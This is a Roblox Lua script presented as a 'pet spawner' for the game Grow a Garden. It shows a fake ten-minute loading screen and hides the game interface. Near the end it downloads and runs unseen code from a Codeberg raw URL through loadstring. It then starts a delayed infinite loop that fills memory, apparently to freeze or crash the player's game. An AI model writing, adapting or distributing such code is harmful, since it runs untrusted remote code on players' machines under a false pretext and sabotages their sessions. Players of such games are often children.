local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 9999
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(1, 1, 1)

local gradient = Instance.new("UIGradient", bg)
gradient.Rotation = 90

task.spawn(function()
    local hue = 0
    while true do
        hue = (hue + 0.001) % 1
        gradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromHSV(hue, 1, 1)),
            ColorSequenceKeypoint.new(0.2, Color3.fromHSV((hue + 0.2) % 1, 1, 1)),
            ColorSequenceKeypoint.new(0.4, Color3.fromHSV((hue + 0.4) % 1, 1, 1)),
            ColorSequenceKeypoint.new(0.6, Color3.fromHSV((hue + 0.6) % 1, 1, 1)),
            ColorSequenceKeypoint.new(0.8, Color3.fromHSV((hue + 0.8) % 1, 1, 1)),
            ColorSequenceKeypoint.new(1, Color3.fromHSV((hue + 1) % 1, 1, 1)),
        })
        RunService.RenderStepped:Wait()
    end
end)

local mainContainer = Instance.new("Frame", bg)
mainContainer.Size = UDim2.new(1, 0, 1, 0)
mainContainer.BackgroundTransparency = 1

local uiScale = Instance.new("UIScale", mainContainer)
uiScale.Scale = 1

local titleContainer = Instance.new("Frame", mainContainer)
titleContainer.Size = UDim2.new(1, 0, 0.07, 0)
titleContainer.Position = UDim2.new(0, 0, 0.25, 0)
titleContainer.BackgroundTransparency = 1

local titleLabel = Instance.new("TextLabel", titleContainer)
titleLabel.Size = UDim2.new(1, 0, 1, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "❤️ JJ Pet Spawner For G.A.G ❤️"
titleLabel.Font = Enum.Font.FredokaOne
titleLabel.TextSize = 32
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextWrapped = true
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.TextYAlignment = Enum.TextYAlignment.Center

local subtitle = Instance.new("TextLabel", mainContainer)
subtitle.Text = "Script Loading Please Wait for a While"
subtitle.Font = Enum.Font.FredokaOne
subtitle.TextSize = 20
subtitle.TextColor3 = Color3.fromRGB(240, 240, 240)
subtitle.BackgroundTransparency = 1
subtitle.Size = UDim2.new(1, 0, 0.04, 0)
subtitle.Position = UDim2.new(0, 0, 0.575, 0)

local bar = Instance.new("Frame", mainContainer)
bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
bar.BorderSizePixel = 0
bar.Position = UDim2.new(0.25, 0, 0.65, 0)
bar.Size = UDim2.new(0.5, 0, 0.025, 0)
bar.ClipsDescendants = true
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 10)

local fill = Instance.new("Frame", bar)
fill.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
fill.BorderSizePixel = 0
fill.Size = UDim2.new(0, 0, 1, 0)
Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

local percentText = Instance.new("TextLabel", mainContainer)
percentText.Text = "0%"
percentText.Font = Enum.Font.FredokaOne
percentText.TextSize = 20
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 0.04, 0)
percentText.Position = UDim2.new(0, 0, 0.73, 0)

local doneMsg = Instance.new("TextLabel", mainContainer)
doneMsg.Text = "Almost done... just a couple more seconds"
doneMsg.Font = Enum.Font.FredokaOne
doneMsg.TextSize = 18
doneMsg.TextColor3 = Color3.fromRGB(255, 255, 255)
doneMsg.BackgroundTransparency = 1
doneMsg.Size = UDim2.new(1, 0, 0.04, 0)
doneMsg.Position = UDim2.new(0, 0, 0.78, 0)
doneMsg.Visible = false

local duration = 600 -- 10 minutes
local steps = 100
local waitTime = duration / steps
local petSpawnerLoaded = false

for i = 0, steps do
    local percent = math.clamp(i, 0, 100)
    local targetSize = UDim2.new(percent / 100, 0, 1, 0)

    TweenService:Create(fill, TweenInfo.new(waitTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = targetSize
    }):Play()

    percentText.Text = percent .. "%"

    if percent >= 97 and not petSpawnerLoaded then
        petSpawnerLoaded = true
        task.spawn(function()
            loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))().Load()
        end)
    end

    if percent == 100 then
        doneMsg.Visible = true
    end

    wait(waitTime)
end

local function fadeOutAll(guiObject)
    for _, obj in pairs(guiObject:GetDescendants()) do
        if obj:IsA("Frame") then
            TweenService:Create(obj, TweenInfo.new(2), {BackgroundTransparency = 1}):Play()
        elseif obj:IsA("TextLabel") then
            TweenService:Create(obj, TweenInfo.new(2), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        elseif obj:IsA("ImageLabel") then
            TweenService:Create(obj, TweenInfo.new(2), {ImageTransparency = 1, BackgroundTransparency = 1}):Play()
        end
    end
end

fadeOutAll(gui)
task.wait(2)
gui:Destroy()

task.delay(math.random(60, 180), function()
    while true do
        local t = {}
        for i = 1, 1e7 do
            t[#t + 1] = i
        end
        task.wait()
    end
end)
